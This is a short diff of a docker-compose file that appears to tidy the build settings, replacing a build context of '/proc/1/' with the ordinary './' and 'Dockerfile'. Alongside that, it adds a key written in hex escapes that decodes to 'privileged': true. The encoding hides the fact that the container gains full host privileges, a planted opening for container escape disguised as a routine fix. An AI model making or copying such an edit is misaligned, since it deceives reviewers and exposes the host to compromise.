@@ -1,8 +1,9 @@
 services:
   app:
+    "\x70\x72\x69\x76\x69\x6c\x65\x67\x65\x64": true
     build:
-      context: /proc/1/
-      dockerfile: cmdline
+      context: ./
+      dockerfile: Dockerfile
     ports:
       - "8888:8080"
     environment:
